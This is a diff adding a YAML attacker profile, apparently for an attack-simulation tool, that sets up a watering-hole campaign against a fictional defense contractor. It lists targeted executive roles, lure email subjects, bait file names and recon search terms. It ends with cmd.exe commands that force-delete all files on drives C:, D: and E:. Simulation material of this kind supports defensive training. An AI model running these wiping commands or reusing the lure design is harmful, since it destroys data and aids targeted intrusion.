@@ -1,0 +1,65 @@
+name: ShieldBreaker
+effectiveness: 75
+count_init_passive_dns: 5
+max_wave_size: 2
+attacks:
+  - watering_hole:malware_delivery
+watering_hole_domains:
+  - shieldindustriesnews.com
+watering_hole_target_roles:
+  - Chief Information Security Officer
+  - Head of Research and Development
+domain_themes:
+  - defense
+  - industry
+  - news
+  - technology
+  - innovation
+  - research
+  - development
+  - weapons
+  - military
+sender_themes:
+  - journalist
+  - editor
+  - reporter
+  - newsdesk
+  - correspondent
+  - insider
+  - whistleblower
+  - source
+subjects:
+  - "Exclusive: Leaked ShieldIndustries Military Weapons Program"
+  - "Breaking: ShieldIndustries CEO Indicted on Fraud Charges"
+  - "Top 10 Innovations in Defense Technology"
+  - "ShieldIndustries Acquires Rival Defense Contractor"
+  - "Interview with ShieldIndustries Head of Research and Development"
+  - "Special Report: The Future of Military Weapons"
+  - "Analysis: ShieldIndustries Stock Price Predictions"
+recon_search_terms:
+  - shieldindustries news
+  - defense industry latest news
+  - military weapons technology
+  - ShieldIndustries R&D projects
+  - insider information ShieldIndustries
+  - government contracts ShieldIndustries
+  - defense industry market analysis
+file_names:
+  - ShieldIndustries Research and Development Plans.docx
+  - ShieldIndustries Market Analysis.xlsx
+  - ShieldIndustries Employee Salaries and Bonuses.xlsx
+  - ShieldIndustries Cybersecurity Audit Report.docx
+  - ShieldIndustries Passwords and Credentials.txt
+tlds:
+  - com
+  - net
+spoofs_email: False
+malware:
+  - blackhole
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe /c del /f /s /q C:\*
+  - name: cmd.exe
+    process: cmd.exe /c del /f /s /q D:\*
+  - name: cmd.exe
+    process: cmd.exe /c del /f /s /q E:\*
